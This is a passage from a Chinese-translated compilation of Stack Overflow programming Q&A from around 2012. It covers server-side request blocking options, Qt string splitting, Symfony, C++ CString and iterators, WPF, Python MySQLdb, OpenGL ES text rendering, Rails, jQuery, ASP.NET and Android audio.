在这一点上，我假设您正在谈论在服务器端阻塞请求。我应该指出，“坏人”客户端用来发送请求的东西现在已经*无关紧要*了。（它可以使用`URL`Apache HTTPComponents 或者它可以在汇编代码中实现 HTTP 协议栈！）

所以真正的问题是您有哪些选项可以阻止不需要的请求。答案是：

*   您可以根据请求 URL 本身进行阻止，但这可能会适得其反。
*   您可以根据请求标头中是否存在会话（或其他）cookie 来阻止。这是进行访问控制的正常方式，假设您安全地发布和处理 cookie，这很难被击败。
*   您可以要求在请求 URL 中传递会话令牌，但这存在基本的安全问题。
*   您可以依赖其他“信息丰富的”标头……例如用户代理标头，但这很容易被击败。
*   您可以根据请求源 IP 地址进行阻止，但坏人需要做的就是从不同的 IP 地址发送请求。
*   您可以通过使用带有客户端证书的 SSL/TLS 上的 HTTP 来限制访问，但这意味着您必须管理所有合法客户端主机的证书，这在大多数环境中都是有问题的。

总之，cookie 是最好的解决方案，因此“好人”客户端应用程序需要使用能够进行 cookie 管理和在请求中设置 cookie 的库。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-01T02:20:57.827

URL 只是您尝试与之交谈的服务器的代表。它有一些方便的方法来打开连接等等，但仅此而已。

会话以两种方式之一进行处理：cookie 或 url 重写。这些与 URL 类几乎没有关系（除了会话 id 被放置在后者的 URL 中）。

用户代理似乎是您最好的选择，缺少一些密码（http 基本、摘要等）或 ssl 证书验证。话虽如此，用户代理完全由客户端自行决定，并且可以很容易地被客户端更改以模拟其他浏览器。

# qt - QString 拆分

> ID：11751697
> 
> 赞同：23
> 
> 时间：2012-08-01T02:11:57.930
> 
> 标签：qt, qt4, split, qstring

我有这些 url 字符串

file:///home/we/Pictures/neededWord/3193_n.jpg

file:///home/smes/Pictures/neededWord/jds_22.png

file:///home/seede/kkske/Pictures/neededWord/3193_n.jpg

我想从它们中提取“neededWord”。从他们看来，图像的名称总是在“neededWord”之后，而字符串中的变化部分在“neededWord”之前。我想到的方法是使用“/”分隔符**从右侧**拆分字符串，并在结果 QstringList 中获取第二个元素。那么如何从右边分裂，或者有更好的方法吗？

* * *

## 回答 #1

> 赞同：44
> 
> 时间：2012-08-01T03:37:26.110

好吧，您只需要倒数第二个元素：

```
QStringList pieces = url.split( "/" );
QString neededWord = pieces.value( pieces.length() - 2 ); 
```

或者，您可以使用正则表达式。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-01T05:13:21.067

我这样修复它：

> ```
> QStringList splitted = info.url().prettyUrl().split("/");
> *header   = splitted.at(splitted.findIndex(splitted.last()) - 1); 
> ```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2018-05-30T14:20:35.250

我会使用[`QString::lastIndexOf()`](http://doc.qt.io/qt-5/qstring.html#lastIndexOf-1)with[`QString::mid()`](http://doc.qt.io/qt-5/qstring.html#mid)来防止不必要的 QString / QStringList 创建和销毁：

```
// Example:
//  0         1         2         3         4         5
//  012345678901234567890123456789012345678901234567890
// "file:///home/we/Pictures/neededWord/3193_n.jpg"

QString neededWord;
int const lastSlash = url.lastIndexOf('/'); // := 35
int const prevSlash = url.lastIndexOf('/', -lastSlash - 1); // := 24
if(lastSlash > prevSlash + 1 && prevSlash >= 0) {
    neededWord = url.mid(prevSlash, lastSlash - prevSlash - 1); // len := 10
} 
```

根据您的需要，您可以使用[QStringRef](http://doc.qt.io/qt-5/qstringref.html)进一步优化它：

```
QStringRef neededWordRef(&url, prevSlash, lastSlash - prevSlash - 1); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-02T12:50:54.257

或者像这样从我的头顶（未测试）：

```
QString neededWord = "";
QString str = "file:///home/seede/kkske/Pictures/neededWord/3193_n.jpg";
QRegExp rx(".*Pictures\\/(\\w+)\\/.*(?:jpg|png|gif|bmp|tiff)");
rx.setMinimal(false);
rx.setCaseSensitivity(Qt::CaseSensitive) // or use Qt::CaseInsensitive
if (rx.indexIn(str) != -1) {
     neededWord = rx.cap(1);
 } 
```

“neededWord”应该在neededWord QString 中。正则表达式模式可以以更优雅的方式进行改进和编写，但我讨厌写那些:)即使它们非常有用！

# php - 如何在 Symfony2 中访问捆绑加载服务？

> ID：11751700
> 
> 赞同：2
> 
> 时间：2012-08-01T02:12:59.610
> 
> 标签：php, symfony

我真的很想知道如何从`Bundle->build(ContainerBuilder)`方法内部访问服务（如教义、树枝等）。

基本上，问题是我需要一个菜单​​系统，捆绑可以添加菜单项，而不需要将它们硬编码在某个模板中。为此，我认为基于服务的菜单会很好地工作（所以我制作了一个菜单构建器服务，用于在控制器中进行测试）。

据我所知，我不能在控制器中执行此操作，因为控制器仅在需要时才加载，我将有多个需要添加菜单项的包，无论它们的控制器是否正在使用。事实上，菜单项在不用于站点导航时更为重要。

我认为这可能与 Bundle->build 方法有关。似乎`ContainerBuilder->get`应该允许我获取服务，但其中只有 service_container 服务（如 getServiceIds 所示）。当 I`ContainerBuilder->get('service_container')->getServiceIds`时，唯一的服务是 service_container。

我现在的想法是，当“构建”捆绑包时，不会加载服务。

有什么我想念的吗？一些可覆盖的方法，一些要监听的事件？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-18T03:09:43.463

这是 Symfony 的事件侦听器/调度组件的完美用例。

与其尝试将项目从服务容器传递到它们不属于的地方，比如捆绑初始化方法，不如让你的菜单构建器类使用 Symfony 的 event_dispatcher 服务发送事件。在构建菜单时，只需将`@event_dispatcher`服务添加为依赖项：

```
services:
    acme_bundle.menu_builder:
        class: Acme\AcmeBundle\Menu\MenuBuilder
        arguments: [@event_dispatcher] 
```

然后，在您的 MenuBuilder 类中，使用 EventDispatcher 发送事件：

```
class MenuBuilder
{
    private $dispatcher;

    public function __construct(EventDispatcherInterface $dispatcher)
    {
        $this->dispatcher = $dispatcher;
    }

    /**
     * Main function for building menus and dispatching related events.
     */
    public function buildMenu()
    {
        $menu = new Menu();
        $event = new MenuEvent('acme_bundle.event_name', $menu);
        $this->dispatcher->dispatch($event);

        return $menu;
    }
} 
```

其他包可以注册为事件的侦听器，并将菜单项添加到菜单：

```
services:
    acme_bundle.configure_menu_listener:
        class: Acme\OtherBundle\Listener\ConfigureMenuListener
        tags:
            - { name: kernel.event_listener, event: 'acme_bundle.event_name', method: configureMenu } 
```

# c++ - 如何在 C++ 中摆脱 CString 中的字符串

> ID：11751701
> 
> 赞同：3
> 
> 时间：2012-08-01T02:13:27.647
> 
> 标签：c++, string, visual-c++, arguments, cstring

我说的 CString 类型是[微软的](http://msdn.microsoft.com/en-us/library/aa300688%28v=vs.60%29).

我尝试了两种方法；

方法 1) 使用 msdn 网站上的 Remove() 和 Replace() 函数，Visual c++ 说`Error:argument of type "const char*" is incompatible with argument of type "wchar_t"`

具体我的代码是：

```
#include <cstring>

CString sTmp= sBody.Mid(nOffset);
CString sFooter= L"https://" + sTmp.Mid(0, nEnd );
sFooter.Remove("amp;"); 
```

而且我不想一次删除一个字符，因为它会摆脱其他'a'。

出于某种原因，当我将 sFooter 转换为 std::string 时，随机的“amp;”出现在不应该存在的字符串中......

我正在将 sFooter 转换为 std::string ，如下所示：

```
CT2CA p (sFooter);
string str (p); 
```

方法2）将CString转换为std::string，然后使用erase()和remove()去掉“amp;”

```
#include <string>
#include <algorithm>

sFooter2.erase(std::remove(sFooter2.begin(), sFooter2.end(), "amp;"), sFooter2.end()); 
```

但 Visual Studio 的输出显示： http: [//pastebin.com/s6tXQ48N](http://pastebin.com/s6tXQ48N)

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-01T03:38:02.413

尝试使用替换。

`sFooter.Replace(_T("&amp;"), _T(""))`;

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-01T02:27:26.260

错误信息非常清楚。您需要使用宽字符串，而不是使用常规字符串。

```
sFooter.Remove(L"amp;"); 
```

同样[根据文档](http://msdn.microsoft.com/en-us/library/ds4931ye.aspx)，该`Remove`方法仅接受单个字符。您需要找到另一种方法来删除整个子字符串。

# wpf - 如何在分隔符之后将 ComboBox 项对齐

> ID：11751702
> 
> 赞同：0
> 
> 时间：2012-08-01T02:13:35.387
> 
> 标签：wpf, combobox, styles, controltemplate, datatrigger

最初，该`ComboBox`项目左对齐。我向 中添加了一个分隔符，`ComboBox`只要出现数据绑定的空值，分隔符就会可见。我想将`ComboBox`分隔符之后的项目向右对齐。有可能做到吗？

```
<cc:TogglingComboBox  FontSize="11" Grid.Column="1" InitialDisplayItem="10"  HorizontalAlignment="Stretch" SelectedValue="{Binding Dye}"  ItemsSource="{Binding Dyes}" Margin="5,3,5,0">
<ComboBox.ItemContainerStyle>                                 
<Style TargetType="{x:Type ComboBoxItem}" BasedOn="{StaticResource {x:Type ComboBoxItem}}">
    <Style.Triggers>

        <DataTrigger Binding="{Binding}" Value="{x:Null}">
            <Setter Property="Template">
                <Setter.Value>
                    <ControlTemplate TargetType="{x:Type ComboBoxItem}">
                        <Separator HorizontalAlignment="Stretch" IsEnabled="False"/>
                    </ControlTemplate>
                </Setter.Value>
            </Setter>
        </DataTrigger>
    </Style.Triggers>
</Style>
</ComboBox.ItemContainerStyle> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-01T05:12:32.990

`DataContext`因为`ComboBoxItem`是某个集合的对象。如我所见，`Separator`每次当集合的源项为空时，都会应用您的模板。如果您知道集合中有固定数量的空值项（例如 1 个），则可以编写`Converter`.

这里有一个例子：

主窗口.xaml

```
<Window x:Class="ComboBoxWithSeparator.MainWindow"
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        xmlns:local="clr-namespace:ComboBoxWithSeparator"
        Title="MainWindow" Height="350" Width="525">
    <Grid>
        <Grid.Resources>
            <local:MyConverter x:Key="MyConverter" />
            <Style TargetType="{x:Type ComboBoxItem}" BasedOn="{StaticResource {x:Type ComboBoxItem}}">
                <Setter Property="HorizontalAlignment">
                    <Setter.Value>
                        <MultiBinding Converter="{StaticResource MyConverter}">
                            <Binding />
                            <Binding RelativeSource="{RelativeSource Mode=FindAncestor, AncestorType=ComboBox}" Path="ItemsSource" />
                        </MultiBinding>
                    </Setter.Value>
                </Setter> 
                <Style.Triggers>
                    <DataTrigger Binding="{Binding}" Value="{x:Null}">
                        <Setter Property="Template">
                            <Setter.Value>
                                <ControlTemplate TargetType="{x:Type ComboBoxItem}">
                                    <Separator HorizontalAlignment="Stretch" IsEnabled="False"/>
                                </ControlTemplate>
                            </Setter.Value>
                        </Setter>
                        <Setter Property="HorizontalAlignment" Value="Stretch" />
                    </DataTrigger>
                </Style.Triggers>
            </Style>
        </Grid.Resources>
        <ComboBox ItemsSource="{Binding}"
                  Width="250"
                  Height="25"/>
    </Grid>
</Window> 
```

主窗口.xaml.cs

```
public partial class MainWindow : Window
{
    public MainWindow()
    {
        InitializeComponent();
        List<string> a = new List<string>()
        {
            "one",
            "two",
            "three",
            "four",
            "five",
            null,
            "seven",
            "eight",
            "nine",
            "ten"
        };
        DataContext = a;
    }
}
public class MyConverter : IMultiValueConverter
{

    public object Convert(object[] values, Type targetType, object parameter, System.Globalization.CultureInfo culture)
    {

        string s = (string)values[0];
        IEnumerable<string> array = (IEnumerable<string>)values[1];

        if (s == null)
            return HorizontalAlignment.Stretch;

        foreach (string item in array)
        {
            if (s == item)
                return HorizontalAlignment.Left;
            if (item == null)
                return HorizontalAlignment.Right;
        }

        return HorizontalAlignment.Left;
    }

    public object[] ConvertBack(object value, Type[] targetTypes, object parameter, System.Globalization.CultureInfo culture)
    {
        throw new NotImplementedException();
    }
} 
```

结果：

![ComboBox 项目在分隔符后右对齐](../Images/99b1d3ca85c2e16daea2469c2dc8a363.png)

# python - 我可以将 with 语句与 MySQLdb.Connection 对象一起使用吗？

> ID：11751703
> 
> 赞同：7
> 
> 时间：2012-08-01T02:13:39.850
> 
> 标签：python, mysql-python

我想知道是否可以将上下文管理器`with`与`Connection`对象一起使用，并编写如下代码：

```
with MySQLdb.connect(...) as conn:
    do_something() 
```

对象会`conn`像对象一样在阻塞后自动关闭`file`吗？

谢谢。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-01T02:39:48.300

MySQLdb 不支持上下文管理器协议。[自己动手，或者改用 oursql。](https://stackoverflow.com/questions/8067690/context-manager-for-pythons-mysqldb)

# android - 在 OpenGL ES 2 中绘制文本的正确方法

> ID：11751715
> 
> 赞同：12
> 
> 时间：2012-08-01T02:15:08.973
> 
> 标签：android, iphone, c++, opengl-es-2.0, bitmap-fonts

我正在使用 PowerVR OpenGL ES 2 SDK 在 Windows 上使用 C++ 开发我的游戏，然后我可以将它移植到 android 或 iphone。

一切看起来都很好，但我现在被文本渲染困住了。我找不到任何关于使用 C++ 在 OpenGL ES 2.0 中渲染文本（使用 TTF 或位图字体）的详细教程。我发现很多关于使用java或objective-c（带有textview、surfaceview或一些诸如此类的东西）在android或iphone上渲染文本的话题，但我认为这不是我需要的。我需要一个“跨平台解决方案”。（或者我现在可能错了吗？）

经过一番研究，我想到了解决方案：

**加载和绑定位图字体纹理**->**解析文本并生成和绑定顶点数组，使用 uv 数组映射纹理，...** ->**将其渲染到屏幕**

我还没有经过测试，但我认为在使用我的解决方案时会出现问题：当我想更改文本时（例如：我正在为用户评分或屏幕上的计时器）我必须重新绑定顶点数组和 uv数组，这不是一个好主意，对吧？

有没有更好的方法/正确的方法来使用 OpenGL ES 2 在屏幕上绘制位图字体？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-03T09:37:04.193

您提到的解决方案是可行的方法，实际上，如果您修改文本，则必须重新创建代表它的几何图形，并将其重新提交给 OpenGL。

这个娱乐步骤需要一些时间，但肯定不会太多。

对于渲染文本，问题有两个主要组成部分：

*   创建你的纹理图集位图
*   使用此纹理绘制文本，考虑字体指标（大小、字距调整等）和可能的亚像素抗锯齿

要创建纹理图集，您可以找到一些代码（可能使用 freetype）或使用现有工具（例如[AngleCode 的 bmfont](http://www.angelcode.com/products/bmfont/)）。

对于绘图，您可能希望基于一些现有代码推出自己的代码，因为有很多细节需要正确获得好看的文本。要开始你的头痛，你可以看看[这篇文章](http://www.antigrain.com/research/font_rasterization/)。

一个很好的现代灵感来源可能是[Nicolas Rougier 的 freetype-gl](http://code.google.com/p/freetype-gl/)代码。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-03T07:12:49.830

文本渲染是 3D 图书馆世界中大多数新手迟早需要面对的主题之一。

互联网上有很多关于文本渲染的教程，很多书都在谈论它。我的建议是环顾四周并尝试了解它们是如何工作的。

TTF 字体不是一个可行的解决方案，因为在实时计算场景（如计算机游戏）中，基于几何的 TTF 技术会消耗太多资源。

一个非常常见的解决方案（例如，我在 PATRIA 3D 引擎中使用的那个）是使用包含不同字符字形的纹理图集，然后您的应用程序逻辑需要处理 text-->glyph 位置关系以进行纹理将构成您最终的“屏幕文本”的四边形。

文本渲染不是一个简单的主题，因为它涉及诸如字距调整/间距/不同文本大小等主题。

尝试点击此链接以最好地理解该主题（如果我没记错的话，这个 wiki 的作者就是这个社区的活跃成员）。

[http://en.wikibooks.org/wiki/OpenGL_Programming/Modern_OpenGL_Tutorial_Text_Rendering_01](http://en.wikibooks.org/wiki/OpenGL_Programming/Modern_OpenGL_Tutorial_Text_Rendering_01)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-12-07T20:07:27.240

在游戏中绘制文本的正确方法是使用带有包含距离字段的字形的纹理图集： [https ://www.mapbox.com/blog/text-signed-distance-fields/](https://www.mapbox.com/blog/text-signed-distance-fields/)

另请参阅 Valve（Half-Life 和 Portal 的创建者）的这篇 Siggraph 论文，描述了该技术的变化：[http ://www.valvesoftware.com/publications/2007/SIGGRAPH2007_AlphaTestedMagnification.pdf](http://www.valvesoftware.com/publications/2007/SIGGRAPH2007_AlphaTestedMagnification.pdf)

基于距离字段的文本质量远高于基于纯位图的文本。它还使用更少的内存，因为距离字段小于字体的逐字位图表示。

# ruby-on-rails - rake db:seed 在生产服务器上失败

> ID：11751717
> 
> 赞同：0
> 
> 时间：2012-08-01T02:15:30.720
> 
> 标签：ruby-on-rails, database, rake-task, seeding

有人能理解这个输出吗？这是非常漫长的一天，我的眼睛都在发呆。昨天它似乎工作正常。

```
rake db:seed --trace
rake aborted!
cannot load such file -- ruby-debug

/home/cooperative/.rbenv/versions/1.9.3-p194/lib/ruby/gems/1.9.1/gems/bundler-1.1.5/lib/bundler/runtime.rb:68:in `require'
/home/cooperative/.rbenv/versions/1.9.3-p194/lib/ruby/gems/1.9.1/gems/bundler-1.1.5/lib/bundler/runtime.rb:68:in `block (2 levels) in require'
/home/cooperative/.rbenv/versions/1.9.3-p194/lib/ruby/gems/1.9.1/gems/bundler-1.1.5/lib/bundler/runtime.rb:66:in `each'
/home/cooperative/.rbenv/versions/1.9.3-p194/lib/ruby/gems/1.9.1/gems/bundler-1.1.5/lib/bundler/runtime.rb:66:in `block in require'
/home/cooperative/.rbenv/versions/1.9.3-p194/lib/ruby/gems/1.9.1/gems/bundler-1.1.5/lib/bundler/runtime.rb:55:in `each'
/home/cooperative/.rbenv/versions/1.9.3-p194/lib/ruby/gems/1.9.1/gems/bundler-1.1.5/lib/bundler/runtime.rb:55:in `require'
/home/cooperative/.rbenv/versions/1.9.3-p194/lib/ruby/gems/1.9.1/gems/bundler-1.1.5/lib/bundler.rb:119:in `require'
/home/cooperative/apps/cooperative/releases/20120801010134/config/application.rb:7:in `<top (required)>'
/home/cooperative/.rbenv/versions/1.9.3-p194/lib/ruby/1.9.1/rubygems/custom_require.rb:36:in `require'
/home/cooperative/.rbenv/versions/1.9.3-p194/lib/ruby/1.9.1/rubygems/custom_require.rb:36:in `require'
/home/cooperative/apps/cooperative/releases/20120801010134/Rakefile:5:in `<top (required)>'
/home/cooperative/.rbenv/versions/1.9.3-p194/lib/ruby/1.9.1/rake/rake_module.rb:25:in `load'
/home/cooperative/.rbenv/versions/1.9.3-p194/lib/ruby/1.9.1/rake/rake_module.rb:25:in `load_rakefile'
/home/cooperative/.rbenv/versions/1.9.3-p194/lib/ruby/1.9.1/rake/application.rb:501:in `raw_load_rakefile'
/home/cooperative/.rbenv/versions/1.9.3-p194/lib/ruby/1.9.1/rake/application.rb:82:in `block in load_rakefile'
/home/cooperative/.rbenv/versions/1.9.3-p194/lib/ruby/1.9.1/rake/application.rb:133:in `standard_exception_handling'
/home/cooperative/.rbenv/versions/1.9.3-p194/lib/ruby/1.9.1/rake/application.rb:81:in `load_rakefile'
/home/cooperative/.rbenv/versions/1.9.3-p194/lib/ruby/1.9.1/rake/application.rb:65:in `block in run'
/home/cooperative/.rbenv/versions/1.9.3-p194/lib/ruby/1.9.1/rake/application.rb:133:in `standard_exception_handling'
/home/cooperative/.rbenv/versions/1.9.3-p194/lib/ruby/1.9.1/rake/application.rb:63:in `run'
/home/cooperative/.rbenv/versions/1.9.3-p194/bin/rake:32:in `<main>' 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-01T02:35:50.167

看起来您刚刚将 Ruby 更新到 1.9.3，显然这与 ruby​​-debug 之间存在一些问题。有关如何（可能）使其工作的详细信息，请参阅[http://devnet.jetbrains.net/thread/431168](http://devnet.jetbrains.net/thread/431168)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-02T04:57:54.603

似乎没有安装 ruby​​-debug gem，在运行 rake db:seed 之前使用 bundle install 。

确保它包含在 gem 文件中。请检查[ruby​​-1.9.3-preview1 上的 ruby​​-debug19](https://stackoverflow.com/questions/7054948/ruby-debug19-on-ruby-1-9-3-preview1)，它可能会对您有所帮助。

# c++ - &*vector::end() 是未定义的行为吗？

> ID：11751722
> 
> 赞同：14
> 
> 时间：2012-08-01T02:16:33.797
> 
> 标签：c++, iterator

我认为`&*vector::end()`这是未定义的行为......直到我看到[一些帖子](http://blogofbrew.blogspot.com/2011/06/benchmarking-stl.html)提到了[Stroustrup 的代码](http://www.stepanovpapers.com/container_benchmark.cpp)：

```
void vector_pointer_test(element_t* first, element_t* last, int number_of_times) 
{ 
       vector<element_t> container(first, last); 
       // &*container.begin() gets us a pointer to the first element 
       sort(&*container.begin(), &*container.end()); 
       unique(&*container.begin(), &*container.end()); 
} 
```

取消引用`end()`迭代器未定义的行为，还是有效？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-01T02:25:51.130

它不一定是未定义的行为，但它取决于迭代器的具体实现：

> C++03 24.1/5 迭代器要求
> 
> 正如指向数组的常规指针保证有一个指针值指向数组的最后一个元素，所以对于任何迭代器类型，都有一个迭代器值指向对应容器的最后一个元素。这些值称为过去值。定义了表达式 *i 的迭代器 i 的值称为可解引用。该库从不假定过去的值是可取消引用的。

`container.end()`如果不可取消引用，则有问题的代码具有未定义的行为。很多时候，向量的迭代器只是一个指针——在这些情况下，没有未定义的行为。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-01T12:01:29.287

这是未定义的行为。也就是说，C++ 标准未定义的行为。它可以由实现来定义。更有可能的是，它在某些情况下会碰巧起作用，而在其他情况下则不会。

在这种情况下，如果迭代器是原始指针，编译器可能会将 &*i 优化为无操作，因此它可能会起作用。Stroustrup 可能知道他的向量使用原始指针作为迭代器。

即使编译器没有优化它，在实践中，如果向量的内存恰好被分配到段边界结束，它也可能会失败。（或者如果编写迭代器实现以检查不可解引用，例如用于调试目的。）

在 C++11 中，这应该写成：

```
sort(container.data(), container.data()+container.size()); 
```

# javascript - 同时计算表行平均值和总计

> ID：11751723
> 
> 赞同：1
> 
> 时间：2012-08-01T02:16:34.667
> 
> 标签：javascript, jquery, html-table

我正在尝试计算动态计算表行平均值所需的 Javascript，然后还更新所有相同类型行的总数。这是一个简化的 jsfiddle，说明了这一点：

[http://jsfiddle.net/fmdataweb/5ZtQZ/3/](http://jsfiddle.net/fmdataweb/5ZtQZ/3/)

用户可以从下拉列表中选择任何类型的水果，然后输入数量和周数。例如，如果他们选择“Apple”并输入 5 作为数字并输入 26 作为周数，我想自动计算平均值，在这种情况下为 2.5（数字 * 周数 / 52）。

然后，我还想自动汇总相同类型水果选择的平均值。目前它正在总计 Number 列 - 我需要将其更改为 Average 列，并在计算平均值后触发。因此，如果用户在不止一行中选择了 Apple，那么它将找到所有的实例，并将平均值列中的值相加。

我从另一个文件中获得了一些代码，可以计算出平均值，但是我无法将 2 个脚本合并为 1 个，或者不知道这是否是最佳选择，或者如何拥有 2 个单独的脚本。这是我发现的一些用于计算平均值的伪代码：

```
$("#fruit input").live("keyup", function(){
var id = this.id.match(/\d+/);
var number = ( ($("#number"+id).val() * $("#weeks"+id).val()  )/52 );
var rounded = Math.round( number * 10 ) / 10;
$("#average"+id).val( rounded ); 
```

如果这会让一切变得更容易，那么很高兴使用 ID。感谢是否有人可以启发我如何实现这一目标，或者您是否可以指出任何类似的示例。我是 Javascript 的新手。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-01T07:49:51.617

我尝试了一种不同的方式，但是很有效：

迭代 tr 单元格，并计算使用 .map() 选择的每个选项的总和

这是JS：

```
$('#fruits')
    .on('change', 'select', calc)
    .on('keyup', 'input', calc);

function calc(){

    $('#fruits tr:has(.fruit)').each(function(i,v){

        var $cel = $(v.cells);

        var $fruit = $cel.eq(1).find('option:selected').val();
        var $numb = $cel.eq(2).find('input').val();
        var $weeks = $cel.eq(3).find('input').val();
        var $avg = ($numb * $weeks) / 52;

        $cel.eq(4).find('input').val($avg);

    });   

    var tot = {};

    $('#fruits tr:has(.fruit) option:selected')
                .map(function(i){
                    var el = $(this).val();
                    var qty = parseFloat($('#fruits tr:has(.fruit)').eq(i).find('td:last input').val());
                    if (!tot.hasOwnProperty(el)) {
                        tot[el] = 0;            
                    }
                    tot[el] += qty
                    return tot;
                }).get();

    //console.log(tot);
    $('#sumApple').text(tot.Apple);
    $('#sumBanana').text(tot.Banana);
    $('#sumMango').text(tot.Mango);

} 
```

这就是[小提琴](http://jsfiddle.net/alex_ball/c4gJU/1/)

PS：我没做过数控，和你的一样

# asp.net - 为什么我的客户端验证向浏览器显示输出？

> ID：11751725
> 
> 赞同：2
> 
> 时间：2012-08-01T02:16:59.313
> 
> 标签：asp.net, validation

我一直在阅读有关[ASP.NET 验证](http://dotnetslackers.com/articles/aspnet/UnderstandingASPNETValidationLibrary.aspx)的内容，并在 SO's [How do I get Client-side validation of ASP.Net page to run? 上找到了一个相关问题？](https://stackoverflow.com/questions/944525)，但似乎没有什么可以解决为什么某些验证会发布到浏览器。

显然，有些不对劲。正在显示以下文本：

> var Page_ValidationActive = false; if (typeof(ValidatorOnLoad) == "function") { ValidatorOnLoad(); } function ValidatorOnSubmit() { if (Page_ValidationActive) { return ValidatorCommonOnSubmit(); } 其他 { 返回真；} } //]]>

最后一点看起来像一个 CDATA 结束标签，我拥有的唯一 CDATA 标签是从 Google 或 Facebook 等社交媒体网站链接的标签。

**谁能告诉我这是什么原因造成的？**

可能我有另一个设置告诉客户端将输出转储到浏览器，就像我在[这篇文章中所做的那样。](https://stackoverflow.com/questions/11731593)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-03T00:32:46.780

那里的代码中有一个`CDATA`部分。如果您复制它，您的代码也会如此。

`CDATA`我通过移动脚本上方的部分进行了实验并得到了相同的结果，如下所示：

```
<![CDATA[
<script type="text/javascript">
var Page_ValidationActive = false;
if (typeof(ValidatorOnLoad) == "function") {
    ValidatorOnLoad();
}

function ValidatorOnSubmit() {
    if (Page_ValidationActive) {
        return ValidatorCommonOnSubmit();
    }
    else {
        return true;
    }
}
//]]>
</script> 
```

在这种情况下，`CDATA`应将标签移至`script`标签下方。或者，完全删除`CDATA`标签。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-08T13:47:18.797

我不明白为什么脚本会显示在网页上，但错误是因为我的一个验证控件被错误地排除在组之外。

一旦我将所有验证控件都包含在验证组中，错误就消失了。

如果有人知道为什么将错误回显到浏览器，请告诉我，以便我可以从我的网站禁用此“功能”。

# ruby-on-rails - 嵌套资源缺少 _url

> ID：11751726
> 
> 赞同：0
> 
> 时间：2012-08-01T02:17:04.180
> 
> 标签：ruby-on-rails, ruby, activerecord

我正在尝试使用 ruby​​ 和 rails 编写一个简单的 api，并且几乎可以正常工作，我只是遇到了一个问题。当我尝试创建嵌套资源时，收到“未定义方法”错误。

我有两个模型，一个是用户模型，一个是记录模型。它们在 routes.rb 中设置如下：

```
resources :users, :except => [:new,:edit] do
  resources :records, :except => [:new,:edit]
end 
```

我的记录控制器包含以下内容：

```
def show
  respond_with @user.records.find(params[:id])
end

def create
  respond_with @user.records.create(params[:record])
end 
```

当我使用参数调用 show 时，它会起作用并返回模型。当我发布创建时，我收到以下错误：

```
NoMethodError: undefined method `record_url' for #<RecordsController:0x007fea3682a5c8> 
```

我不确定为什么会发生这种情况，但如果有人有任何想法，我将不胜感激。此外，如果需要更多代码来提供帮助，请告诉我，以便我可以添加它。

忘记添加我的 rake 路线：

```
user_records GET    /users/:user_id/records(.:format)     records#index
             POST   /users/:user_id/records(.:format)     records#create
 user_record GET    /users/:user_id/records/:id(.:format) records#show
             PUT    /users/:user_id/records/:id(.:format) records#update
             DELETE /users/:user_id/records/:id(.:format) records#destroy
       users GET    /users(.:format)                      users#index
             POST   /users(.:format)                      users#create
        user GET    /users/:id(.:format)                  users#show
             PUT    /users/:id(.:format)                  users#update
             DELETE /users/:id(.:format)                  users#destroy 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-01T02:33:48.880

```
@record =  @user.records.create(params[:record])
respond_with(@user, @record) 
```

# php - “getResults()”在教义查询中返回什么类型的对象

> ID：11751727
> 
> 赞同：1
> 
> 时间：2012-08-01T02:17:05.570
> 
> 标签：php, symfony, doctrine-orm, marie

`find(id)`当我使用then执行查询时，它可以正常工作。
但是当我使用`createQuery`像这样的方法时

`select u from User u where u.id = 1`然后我得到错误，它是一个数组。

所以我想知道它是否总是返回一个数组，即使结果是1？

我试过`getMaxResults(1)`了，但我得到了同样的错误

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-01T07:33:33.440

您的问题的答案可以在[文档](http://symfony.com/doc/current/book/doctrine.html#querying-for-objects-with-dql)中找到。它说

> getResult() 方法返回一个结果数组。如果您只查询一个对象，则可以改用 getSingleResult() 方法：

您还应该检查此[文档](http://docs.doctrine-project.org/projects/doctrine-orm/en/2.0.x/reference/dql-doctrine-query-language.html)。

# android - 在android中使用来自RingtoneManager.getDefaultUri（RingtoneManager.TYPE_ALARM）的uri播放声音时无法创建媒体播放器

> ID：11751728
> 
> 赞同：5
> 
> 时间：2012-08-01T02:17:14.183
> 
> 标签：android, android-mediaplayer

我正在尝试使用以下代码在 android 中播放默认警报声音-

```
private void startAlarm() {
        Uri alert = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM);
        if (alert == null) {
            alert = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION);
            if (alert == null) {
                alert = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE);
            }
        }
        MediaPlayer mMediaPlayer = new MediaPlayer();
        try {
            mMediaPlayer.setDataSource(getActivity().getApplicationContext(), alert);
            AudioManager audioManager = (AudioManager) getActivity().getSystemService(Context.AUDIO_SERVICE);
            int volumen = audioManager.getStreamVolume(AudioManager.STREAM_ALARM);
            if (volumen != 0) {
                mMediaPlayer.setAudioStreamType(AudioManager.STREAM_ALARM);
                mMediaPlayer.setLooping(true);
                mMediaPlayer.prepare();
                mMediaPlayer.start();
            }
        } catch (IllegalArgumentException e) {
            e.printStackTrace();
        } catch (SecurityException e) {
            e.printStackTrace();
        } catch (IllegalStateException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
    } 
```

